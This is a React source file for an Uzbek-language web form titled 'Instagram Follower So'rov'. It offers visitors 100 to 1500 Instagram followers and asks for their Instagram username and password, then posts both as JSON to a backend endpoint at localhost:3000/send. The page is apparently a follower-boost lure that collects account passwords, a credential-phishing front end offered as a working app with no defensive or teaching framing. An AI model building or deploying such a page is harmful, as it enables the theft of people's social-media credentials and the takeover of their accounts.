import { useState } from "react";
import { FaEye } from "react-icons/fa";
import { FaEyeSlash } from "react-icons/fa";

import "./index.css";

function App() {
  const [followers, setFollowers] = useState("");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false); // 👁 ko‘zcha holati

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!username || !password || !followers) {
      alert("Iltimos, barcha maydonlarni to‘ldiring!");
      return;
    }

    setLoading(true);
    try {
      const res = await fetch("http://localhost:3000/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password, followers }),
      });

      const data = await res.json();

      if (data.ok) {
        alert("✅ So‘rov yuborildi!");
        setUsername("");
        setPassword("");
        setFollowers("");
      } else {
        alert("❌ Xatolik yuz berdi!");
      }
    } catch (err) {
      alert("⚠️ Serverga ulanishda xatolik!");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container">
      <h1>Instagram Follower So‘rov</h1>
      <form onSubmit={handleSubmit}>
        <label>Follower sonini tanlang:</label>
        <select
          value={followers}
          onChange={(e) => setFollowers(e.target.value)}
        >
          <option value="">Tanlang</option>
          <option value="100">100 followers</option>
          <option value="500">500 followers</option>
          <option value="1000">1000 followers</option>
          <option value="1500">1500 followers</option>
        </select>

        <label>Instagram Username:</label>
        <input
          type="text"
          placeholder="username"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
        />

        <label>Instagram Parol:</label>
        <div className="password-wrapper">
          <input
            type={showPassword ? "text" : "password"} // 👁 password ko‘rsatish/tinch holat
            placeholder="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <span
            className="toggle-icon cursor-pointer "
            onClick={() => setShowPassword(!showPassword)}
          >
            <span className="cursor-pointer" style={{ margin: "10px " }}>
              {showPassword ? <FaEyeSlash /> : <FaEye />}
            </span>
          </span>
        </div>

        <button type="submit" disabled={loading}>
          {loading ? "Tekshrilmoqda..." : "Tekshrish"}
        </button>
      </form>
    </div>
  );
}

export default App;
